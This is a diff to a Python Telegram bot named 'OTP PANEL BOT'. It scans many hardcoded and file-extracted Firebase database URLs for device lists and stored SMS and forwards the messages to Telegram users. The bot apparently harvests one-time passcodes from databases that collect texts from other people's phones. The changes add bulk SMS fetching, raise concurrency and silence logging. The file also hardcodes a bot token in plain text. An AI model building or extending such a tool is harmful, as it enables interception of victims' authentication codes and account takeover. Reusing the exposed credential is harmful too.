@@ -3,7 +3,7 @@
 ══════════════════════════════════════════════════════
   OTP PANEL BOT — PRIVATE ADMIN EDITION           
   ULTRA-SPEED PROGRESSIVE SCANNER & NON-BLOCKING UI
-  (RAILWAY LIFETIME STABLE EDITION - FIXED LIST & RAM)
+  (RAILWAY STABLE EDITION - ANTI-RESET LOGIC)
 ══════════════════════════════════════════════════════
 """
 
@@ -74,9 +74,8 @@ LOCAL_URLS = extract_urls_from_files()
 RAW_URLS = list(set(HARDCODED_URLS + LOCAL_URLS))
 DATABASES = {f"P_{i}": url for i, url in enumerate(RAW_URLS)}
 
-# 🔥 SMART POLLING (Reduces RAM load)
-POLL_INTERVAL   = 10  # SMS Check every 10 seconds
-CACHE_INTERVAL  = 600 # Full Device List Update every 10 minutes (600 seconds)
+POLL_INTERVAL   = 10  
+CACHE_INTERVAL  = 600 
 SMS_LIMIT       = 20       
 TOKEN           = "8218848065:AAFw5snj5NTWbayoXSHHIaNEg-vFPuXGm-4"
 BOT_USERNAME    = "freepanelssmsbot"
@@ -123,9 +122,9 @@ SETTINGS = {
     "global_panels": []
 }
 
-# 🔥 LIFETIME STABLE SEMAPHORES
-HTTP_SEMAPHORE = asyncio.Semaphore(20)
-WORKER_SEMAPHORE = asyncio.Semaphore(20)
+# 🔥 BALANCED SEMAPHORES FOR SPEED + STABILITY
+HTTP_SEMAPHORE = asyncio.Semaphore(50)
+WORKER_SEMAPHORE = asyncio.Semaphore(50)
 
 API_LOCK = asyncio.Lock()
 
@@ -334,8 +333,7 @@ def is_spamming(user_id: int) -> bool:
     return False
 
 def tlog(msg: str) -> None:
-    t = datetime.now().strftime("%I:%M:%S %p")
-    print(f"[{t}]  {msg}", flush=True)
+    pass # Print hata diya taaki logs clear rahein
 
 async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
     err_str = str(context.error)
@@ -346,8 +344,6 @@ async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYP
     ]
     if any(e in err_str for e in ignore_errors):
         return
-    if re.match(r"^-?\d+$", err_str.strip()): 
-        return
     pass
 
 # ═══════════════════════════════════════════════════════
@@ -357,7 +353,7 @@ async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYP
 async def get_http_session() -> aiohttp.ClientSession:
     global _http_session
     if _http_session is None or _http_session.closed:
-        connector = aiohttp.TCPConnector(limit=30, use_dns_cache=True, ttl_dns_cache=300)
+        connector = aiohttp.TCPConnector(limit=50, use_dns_cache=True, ttl_dns_cache=300)
         _http_session = aiohttp.ClientSession(connector=connector)
     return _http_session
 
@@ -618,8 +614,6 @@ async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = Non
             number_map[d.id] = d 
 
     unique_devices = list(number_map.values())
-    
-    # 🔥 FIXED UP-DOWN JUMP ISSUE: Sorted by Status and then Alphabetically by Number/ID.
     unique_devices.sort(key=lambda d: (0 if d.status == "online" else 1, d.numbers[0] if d.numbers else d.id))
     return unique_devices
 
@@ -862,7 +856,7 @@ async def safe_edit(query_or_msg, text, reply_markup=None, parse_mode=None, disa
         elif hasattr(query_or_msg, 'edit_text'):
             await query_or_msg.edit_text(text, reply_markup=reply_markup, parse_mode=parse_mode, disable_web_page_preview=disable_web_page_preview)
     except BadRequest as e:
-        if "not modified" not in str(e).lower(): tlog(f"Edit Message Error: {e}")
+        if "not modified" not in str(e).lower(): pass
     except Exception:
         pass
 
@@ -1204,7 +1198,6 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             return
 
     except Exception as e:
-        tlog(f"Callback error [{data}]: {e}")
         try: await query.answer("An error occurred, please try again.", show_alert=True)
         except: pass
 
@@ -1523,7 +1516,7 @@ async def _forward_sms(device: Device, sms: dict) -> None:
 
 WORK_QUEUE = asyncio.Queue()
 ACTIVE_WORKERS = []
-MAX_WORKERS = 10 # Balance between speed and RAM safety
+MAX_WORKERS = 15 
 
 async def worker_auto_scaler():
     while True:
@@ -1542,10 +1535,26 @@ async def db_processor_worker():
             if job_type == "INIT" or job_type == "CACHE_UPDATE":
                 try: 
                     devs = await fetch_db_data(tag, url)
-                    if devs: GLOBAL_DEVICE_CACHE[tag] = devs
+                    if devs: # 🔥 MAGIC FIX: Data sirf tabhi update hoga jab API kuch return karega, blank list nahi aayegi.
+                        GLOBAL_DEVICE_CACHE[tag] = devs
                 except: pass
                 
                 if job_type == "INIT":
+                    r_main, r_user, r_root = await asyncio.gather(fb_get("All_Users/sms", url), fb_get("user_sms", url), fb_get("sms", url), return_exceptions=True)
+                    for bulk in (r_main, r_user, r_root):
+                        if not isinstance(bulk, dict): continue
+                        for dev_id, sms_dict in bulk.items():
+                            if not isinstance(sms_dict, dict): continue
+                            for k in sms_dict: seen_ids.add(seen_key(dev_id, k))
+                                
+                    type4_devs = [d for d in GLOBAL_DEVICE_CACHE.get(tag, []) if d.sms_path.endswith("receivedSms")]
+                    if type4_devs:
+                        async def init_t4(d: Device):
+                            sms_dict = await fb_get(d.sms_path, d.base_url)
+                            if isinstance(sms_dict, dict):
+                                for k in sms_dict: seen_ids.add(seen_key(d.id, k))
+                        await asyncio.gather(*(init_t4(d) for d in type4_devs), return_exceptions=True)
+
                     global SCAN_PROGRESS
                     SCAN_PROGRESS["completed"] += 1
 
@@ -1582,7 +1591,6 @@ async def db_processor_worker():
                                 except: pass
                     await asyncio.gather(*(fetch_t4_sms(d) for d in type4_devs), return_exceptions=True)
             
-            # 🔥 STRICT RAM PROTECTION
             if len(seen_ids) > 20000:
                 seen_ids.clear()
 
@@ -1608,8 +1616,6 @@ async def cache_compiler():
                 n_map[d.id] = d
                     
         res = list(n_map.values())
-        
-        # 🔥 FIXED UP-DOWN JUMP ISSUE: Sorted by Status and then Alphabetically by Number/ID.
         res.sort(key=lambda d: (0 if d.status == "online" else 1, d.numbers[0] if d.numbers else d.id))
         GLOBAL_DEVICE_CACHE["ALL"] = res
 
@@ -1635,13 +1641,11 @@ async def master_dispatcher(app: Application) -> None:
                 print("\n✅ Bot started successfully. Listening for commands...\n")
             else:
                 now = time.time()
-                # Server load optimization: Only fetch full device list every 10 mins
                 if now - last_cache_time > CACHE_INTERVAL:
                     for tag, url in dbs_to_poll.items():
                         await WORK_QUEUE.put(("CACHE_UPDATE", tag, url))
                     last_cache_time = now
                 
-                # Fast polling only for SMS every 10 seconds
                 for tag, url in dbs_to_poll.items():
                     await WORK_QUEUE.put(("POLL", tag, url))
                     
